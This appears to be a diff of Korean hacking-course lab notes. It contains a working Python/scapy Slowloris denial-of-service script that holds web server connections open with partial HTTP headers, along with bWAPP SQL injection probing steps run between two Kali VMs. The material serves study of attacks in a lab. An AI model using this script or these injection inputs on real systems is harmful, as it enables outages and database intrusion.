@@ -27,29 +27,29 @@ Updated: Dec 11, 2019 10:48 PM
             syn.append(IP(dst=target)/TCP(sport=RandNum(1024,65535),dport=80,flags='S'))
     		
     		syn_ack = sr(syn, verbose=0)[0]
-    
-        ack = []
-        for sa in syn_ack :
-            payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num))) +\
-            "Host: {}\r\n".format(target) +\
-            "User-Agent: Mozilla/4.0\r\n" +\
-            "Content-Length: 42\r\n"
-    
-            ack.append(IP(dst=target)/TCP(sport=sa[1].dport,dport=80,flags="A",seq=sa[1].ack,ack=sa[1].seq+1)/payload)
-        
-        answer = sr(ack, verbose=0)[0]
-        print "{} connection success!\t Fail: {}".format(len(answer), num-len(answer))
-        print "Sending data \"X-a: b\\r\\n\".."
-    
-        count = 1
-        while True :
-            print "{} time sending".format(count)
-            ack = []
-            for ans in answer :
-                ack.append(IP(dst=target)/TCP(sport=ans[1].dport,dport=80,flags="PA",seq=ans[1].ack,ack=ans[1].seq)/"X-a: b\r\n")
-            answer = sr(ack, inter=0.5, verbose=0)[0]
-            time.sleep(10)
-            count += 1
+    	
+    	ack = []
+    	for sa in syn_ack :
+    	    payload = "GET /{} HTTP/1.1\r\n".format(str(RandNum(1,num))) +\
+    	    "Host: {}\r\n".format(target) +\
+    	    "User-Agent: Mozilla/4.0\r\n" +\
+    	    "Content-Length: 42\r\n"
+    	
+    	    ack.append(IP(dst=target)/TCP(sport=sa[1].dport,dport=80,flags="A",seq=sa[1].ack,ack=sa[1].seq+1)/payload)
+    	
+    	answer = sr(ack, verbose=0)[0]
+    	print "{} connection success!\t Fail: {}".format(len(answer), num-len(answer))
+    	print "Sending data \"X-a: b\\r\\n\".."
+    	
+    	count = 1
+    	while True :
+    	    print "{} time sending".format(count)
+    	    ack = []
+    	    for ans in answer :
+    	        ack.append(IP(dst=target)/TCP(sport=ans[1].dport,dport=80,flags="PA",seq=ans[1].ack,ack=ans[1].seq)/"X-a: b\r\n")
+    	    answer = sr(ack, inter=0.5, verbose=0)[0]
+    	    time.sleep(10)
+    	    count += 1
     
     if __name__ == "__main__" :
         if len(sys.argv) < 3 :
@@ -66,12 +66,12 @@ Updated: Dec 11, 2019 10:48 PM
     - `python [slowloris.py](http://slowloris.py/) KALI#1_IP 50`
     50개의 패킷을 Kalli #1에게 전송
 
-        ![Day%207%20Slowloris%20Attack/Untitled.png](Day%207%20Slowloris%20Attack/Untitled.png)
+        ![Day%207%20Slowloris%20Attack/Untitled.png](images/Day%207%20Slowloris%20Attack/Untitled.png)
 
 - **Kally #1의 브라우저 (localhost/server-status)**
 - 50개의 패킷 요청을 읽고 있음
 
-    ![Day%207%20Slowloris%20Attack/Untitled%201.png](Day%207%20Slowloris%20Attack/Untitled%201.png)
+    ![Day%207%20Slowloris%20Attack/Untitled%201.png](images/Day%207%20Slowloris%20Attack/Untitled%201.png)
 
 - Kally #1
     - mysql 서버 재기동
@@ -79,7 +79,7 @@ Updated: Dec 11, 2019 10:48 PM
 - Kally #2
     - (브라우저) Kally #1의 bWAPP 로 접속 `Kally #1_ip /bWAPP`
 
-        ![Day%207%20Slowloris%20Attack/Untitled%202.png](Day%207%20Slowloris%20Attack/Untitled%202.png)
+        ![Day%207%20Slowloris%20Attack/Untitled%202.png](images/Day%207%20Slowloris%20Attack/Untitled%202.png)
 
         영화 조회 서비스
 
@@ -95,7 +95,7 @@ Updated: Dec 11, 2019 10:48 PM
         [사용 → 쿼리문을 만드는데 사용될 것으로 유추]
         select * from movies where title = '%man%'
 
-        ![Day%207%20Slowloris%20Attack/Untitled%203.png](Day%207%20Slowloris%20Attack/Untitled%203.png)
+        ![Day%207%20Slowloris%20Attack/Untitled%203.png](images/Day%207%20Slowloris%20Attack/Untitled%203.png)
 
         입력값이 전달/사용 과정에서 조작이 발생하는지를 확인할 때
 
@@ -111,15 +111,15 @@ Updated: Dec 11, 2019 10:48 PM
         [사용 → 쿼리문을 만드는데 사용될 것으로 유추]
         select * from movies where title = '%man'%'
 
-        ![Day%207%20Slowloris%20Attack/Untitled%204.png](Day%207%20Slowloris%20Attack/Untitled%204.png)
+        ![Day%207%20Slowloris%20Attack/Untitled%204.png](images/Day%207%20Slowloris%20Attack/Untitled%204.png)
 
         ⇒ 백엔드 db가 mysql이라는 정보와 화면에서 입력한 값은 그대로 쿼리의 생성/실행에 활용됨
 
         - 정상적인 쿼리가 반환하는 컬럼의 개수를 확인
 
-        ![Day%207%20Slowloris%20Attack/Untitled%205.png](Day%207%20Slowloris%20Attack/Untitled%205.png)
+        ![Day%207%20Slowloris%20Attack/Untitled%205.png](images/Day%207%20Slowloris%20Attack/Untitled%205.png)
 
-        ![Day%207%20Slowloris%20Attack/Untitled%206.png](Day%207%20Slowloris%20Attack/Untitled%206.png)
+        ![Day%207%20Slowloris%20Attack/Untitled%206.png](images/Day%207%20Slowloris%20Attack/Untitled%206.png)
 
 - 웹 해킹 관련 서적
     - 클라이언트 side :
